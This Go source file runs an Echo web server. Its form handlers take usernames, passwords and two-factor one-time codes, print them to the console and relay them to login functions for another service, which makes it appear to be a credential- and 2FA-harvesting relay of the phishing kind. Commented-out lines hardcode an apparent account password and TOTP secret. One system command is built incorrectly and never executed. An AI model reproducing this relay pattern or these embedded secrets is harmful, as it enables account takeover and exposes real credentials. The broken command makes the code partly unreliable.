package main

import (
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"text/template"

	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
	"github.com/xlzd/gotp"
)

var otpcode string
var username string
var identifierr string

type TemplateRenderer struct {
	templates *template.Template
}

// Render renders a template document
func (t *TemplateRenderer) Render(w io.Writer, name string, data interface{}, c echo.Context) error {

	// Add global methods if data is a map
	if viewContext, isMap := data.(map[string]interface{}); isMap {
		viewContext["reverse"] = c.Echo().Reverse
	}

	return t.templates.ExecuteTemplate(w, name, data)
}
func otpuret(secret string) string {
	exec.Command("sudo ntpdate time.nist.gov")

	otpcode = gotp.NewDefaultTOTP(secret).Now()
	return otpcode

}
func mainHandler(c echo.Context) error {

	return c.Render(http.StatusOK, "index.html", map[string]interface{}{
		"name": "merd!",
	})
}

func loginHandler(c echo.Context) error {
	psw := c.FormValue("psw")
	username = c.FormValue("username")
	LoginWeb(username, psw)
	fmt.Println(username, psw, identifier, identifierr)
	if fac == 1 {
		LoginApi(username, psw)
		return c.Render(http.StatusOK, "index3.html", map[string]interface{}{
			"name": "merd!",
		})
	} else if websuphe == 1 {
		return c.Render(http.StatusOK, "index4.html", map[string]interface{}{
			"name": "merd!",
		})
	}
	return c.Render(http.StatusOK, "index2.html", map[string]interface{}{
		"username": username,
		"psw":      psw,
		"fac":      fac,
	})
}

func apitwofactorloginHandler(c echo.Context) error {
	otpinput := c.FormValue("otpinput")
	println("TWOFACKODUGIRILEN", otpinput)

	FactorLogin(identifierr, otpinput, username)
	fmt.Println(sessiond)
	fmt.Println("durdu")

	if passtwo == 1 {
		gettwo(sessiondweb)
		return c.Render(http.StatusOK, "index2.html", map[string]interface{}{
			"username": username,
		})
	} else if passtwo == 0 {
		return c.Render(http.StatusOK, "index3wrong.html", map[string]interface{}{
			"username": username,
		})
	} else {
		return c.Render(http.StatusOK, "index2.html", map[string]interface{}{
			"username": username,
		})
	}

}

func supheloginHandler(c echo.Context) error {
	supheinput := c.FormValue("supheinput")
	postkodsuphe(checkurl, supheinput)
	if webgiris == 1 {
		return c.Render(http.StatusOK, "index5.html", map[string]interface{}{
			"username": username,
		})
	} else {
		return c.Render(http.StatusOK, "index2.html", map[string]interface{}{
			"username": username,
		})
	}

}
func main() {
	// usr := "prodmeppy"
	// pw := "Aqwer56merttt"
	// LoginApi(usr, pw)
	// println(sessiond)
	// secret := "3EWLT7KHI6IQ35BYKWWREHNWR3DT37A7"
	// otpuret(secret)
	// fmt.Println(otpcode)
	// fmt.Scanln()
	e := echo.New()
	e.Use(middleware.LoggerWithConfig(middleware.LoggerConfig{
		Format: `"ip=${remote_ip} status=${status} time=${time_rfc3339} agent=${user_agent}" uri=${uri}` + "\n",
	}))
	renderer := &TemplateRenderer{
		templates: template.Must(template.ParseGlob("*.html")),
	}
	e.Renderer = renderer

	e.GET("/", mainHandler)
	e.POST("/login", loginHandler)
	e.POST("/twologin", apitwofactorloginHandler)
	e.POST("/suphelogin", supheloginHandler)

	e.Start(":80")

}
